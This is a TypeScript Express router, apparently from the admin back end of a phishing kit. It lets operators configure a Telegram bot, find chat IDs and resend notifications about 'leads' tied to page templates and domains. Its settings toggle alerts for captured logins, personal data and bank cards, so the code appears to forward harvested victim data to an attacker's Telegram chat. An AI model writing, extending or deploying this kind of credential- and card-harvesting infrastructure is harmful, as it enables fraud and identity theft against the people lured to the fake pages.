import express from 'express';
import { getDb } from '../database';
import { authenticateJWT, requireAdmin } from '../middleware';
import { 
  getTelegramSettings, 
  updateTelegramSettings 
} from '../database/tables/telegram_settings';
import { telegramService } from '../services/telegramService';

const router = express.Router();

// Get Telegram settings (admin only)
router.get('/settings', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const db = getDb();
    const settings = getTelegramSettings(db);
    
    if (!settings) {
      return res.json({
        bot_token: '',
        chat_id: '',
        admin_chat_id: '',
        notifications_enabled: true,
        notify_on_login: true,
        notify_on_personal_data: true,
        notify_on_bank_card: true,
        notify_on_completion: true,
        message_template: null
      });
    }

    // Don't send the full bot token to frontend for security
    const safeSettings = {
      ...settings,
      bot_token: settings.bot_token ? '***CONFIGURED***' : '',
      bot_token_configured: !!settings.bot_token
    };

    return res.json(safeSettings);
  } catch (error) {
    console.error('Error fetching Telegram settings:', error);
    return res.status(500).json({ message: 'Server error fetching Telegram settings' });
  }
});

// Update Telegram settings (admin only)
router.put('/settings', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const {
      bot_token,
      chat_id,
      admin_chat_id,
      notifications_enabled,
      notify_on_login,
      notify_on_personal_data,
      notify_on_bank_card,
      notify_on_completion,
      message_template
    } = req.body;

    // Validate required fields
    if (notifications_enabled && (!bot_token || !chat_id)) {
      return res.status(400).json({ 
        message: 'Bot token and chat ID are required when notifications are enabled' 
      });
    }

    // Validate bot token format if provided
    if (bot_token && bot_token !== '***CONFIGURED***') {
      const tokenRegex = /^\d+:[A-Za-z0-9_-]+$/;
      if (!tokenRegex.test(bot_token)) {
        return res.status(400).json({ 
          message: 'Invalid bot token format. Expected format: 123456789:ABC-DEF...' 
        });
      }
    }

    // Validate chat ID format if provided
    if (chat_id) {
      const chatIdRegex = /^-?\d+$/;
      if (!chatIdRegex.test(chat_id)) {
        return res.status(400).json({ 
          message: 'Invalid chat ID format. Expected numeric value (negative for groups)' 
        });
      }
    }

    const db = getDb();
    
    // Prepare update data
    const updateData: any = {
      notifications_enabled: notifications_enabled ?? true,
      notify_on_login: notify_on_login ?? true,
      notify_on_personal_data: notify_on_personal_data ?? true,
      notify_on_bank_card: notify_on_bank_card ?? true,
      notify_on_completion: notify_on_completion ?? true,
      message_template: message_template || null
    };

    // Only update bot_token if a new one is provided
    if (bot_token && bot_token !== '***CONFIGURED***') {
      updateData.bot_token = bot_token;
    }

    // Only update chat_id if provided
    if (chat_id) {
      updateData.chat_id = chat_id;
    }

    // Only update admin_chat_id if provided
    if (admin_chat_id !== undefined) {
      updateData.admin_chat_id = admin_chat_id || null;
    }

    // Update settings
    const updated = updateTelegramSettings(db, updateData);
    
    if (!updated) {
      return res.status(500).json({ message: 'Failed to update Telegram settings' });
    }

    // Reinitialize Telegram service with new settings
    if (bot_token && bot_token !== '***CONFIGURED***') {
      try {
        await telegramService.reinitialize();
        console.log('✅ Telegram service reinitialized with new settings');
      } catch (error) {
        console.warn('⚠️ Failed to reinitialize Telegram service:', error);
      }
    }

    return res.json({ 
      message: 'Telegram settings updated successfully',
      updated: true
    });
  } catch (error) {
    console.error('Error updating Telegram settings:', error);
    return res.status(500).json({ message: 'Server error updating Telegram settings' });
  }
});

// Send test notification (admin only)
router.post('/test', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const { chat_id } = req.body;
    
    if (!chat_id) {
      return res.status(400).json({ message: 'Chat ID is required for test notification' });
    }

    // Send test notification
    const success = await telegramService.sendTestNotification(chat_id);
    
    if (success) {
      return res.json({ 
        message: 'Test notification sent successfully',
        success: true
      });
    } else {
      return res.status(500).json({ 
        message: 'Failed to send test notification',
        success: false
      });
    }
  } catch (error) {
    console.error('Error sending test notification:', error);
    return res.status(500).json({ 
      message: `Test notification failed: ${error.message}`,
      success: false
    });
  }
});

// Get bot status (admin only)
router.get('/status', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const status = await telegramService.getBotStatus();
    return res.json(status);
  } catch (error) {
    console.error('Error getting bot status:', error);
    return res.status(500).json({ 
      connected: false, 
      error: 'Server error getting bot status' 
    });
  }
});

// Discover chat IDs for bot setup (admin only)
router.post('/discover-chats', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const { bot_token } = req.body;
    
    if (!bot_token) {
      return res.status(400).json({ message: 'Bot token is required' });
    }

    // Validate bot token format
    const tokenRegex = /^\d+:[A-Za-z0-9_-]+$/;
    if (!tokenRegex.test(bot_token)) {
      return res.status(400).json({ 
        message: 'Invalid bot token format. Expected format: 123456789:ABC-DEF...' 
      });
    }

    // Get recent chats from bot updates
    const chatInfo = await telegramService.getRecentChats(bot_token);
    
    if (chatInfo.error) {
      return res.status(400).json({ 
        message: `Failed to discover chats: ${chatInfo.error}`,
        success: false
      });
    }

    return res.json({
      message: 'Chat discovery completed',
      success: true,
      adminChats: chatInfo.adminChats,
      groupChats: chatInfo.groupChats,
      instructions: {
        admin: 'Send /start to the bot in a private message to get your admin chat ID',
        group: 'Add the bot to a group and send any message to get the group chat ID'
      }
    });
  } catch (error) {
    console.error('Error discovering chats:', error);
    return res.status(500).json({ 
      message: `Chat discovery failed: ${error.message}`,
      success: false
    });
  }
});

// Get bot information (admin only)
router.post('/bot-info', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const { bot_token } = req.body;
    
    if (!bot_token) {
      return res.status(400).json({ message: 'Bot token is required' });
    }

    // Validate bot token format
    const tokenRegex = /^\d+:[A-Za-z0-9_-]+$/;
    if (!tokenRegex.test(bot_token)) {
      return res.status(400).json({ 
        message: 'Invalid bot token format. Expected format: 123456789:ABC-DEF...' 
      });
    }

    // Get bot info
    const isValid = await telegramService.validateBotToken(bot_token);
    
    if (!isValid) {
      return res.status(400).json({ 
        message: 'Invalid bot token',
        success: false
      });
    }

    // Create temporary bot to get info
    const TelegramBot = require('node-telegram-bot-api');
    const tempBot = new TelegramBot(bot_token, { polling: false });
    const botInfo = await tempBot.getMe();

    return res.json({
      success: true,
      botInfo: {
        id: botInfo.id,
        username: botInfo.username,
        first_name: botInfo.first_name,
        can_join_groups: botInfo.can_join_groups,
        can_read_all_group_messages: botInfo.can_read_all_group_messages
      }
    });
  } catch (error) {
    console.error('Error getting bot info:', error);
    return res.status(500).json({ 
      message: `Failed to get bot info: ${error.message}`,
      success: false
    });
  }
});

// Resend notification for specific lead (admin only)
router.post('/resend/:id', authenticateJWT, requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const db = getDb();
    
    // Get lead with template and domain info
    const lead = db.prepare(`
      SELECT 
        l.*,
        t.name as template_display_name,
        t.folder_name as template_name,
        d.domain_name
      FROM leads l
      JOIN templates t ON l.template_id = t.id
      JOIN domains d ON l.domain_id = d.id
      WHERE l.id = ?
    `).get(id);
    
    if (!lead) {
      return res.status(404).json({ message: 'Lead not found' });
    }

    // Send notification
    const success = await telegramService.sendLeadNotification(lead);
    
    if (success) {
      // Update notification status
      db.prepare(`
        UPDATE leads 
        SET notification_sent = 1, notification_sent_at = CURRENT_TIMESTAMP, notification_error = NULL
        WHERE id = ?
      `).run(id);
      
      return res.json({ 
        message: 'Notification resent successfully',
        success: true
      });
    } else {
      return res.status(500).json({ 
        message: 'Failed to resend notification',
        success: false
      });
    }
  } catch (error) {
    console.error('Error resending notification:', error);
    return res.status(500).json({ 
      message: `Resend failed: ${error.message}`,
      success: false
    });
  }
});

export default router;
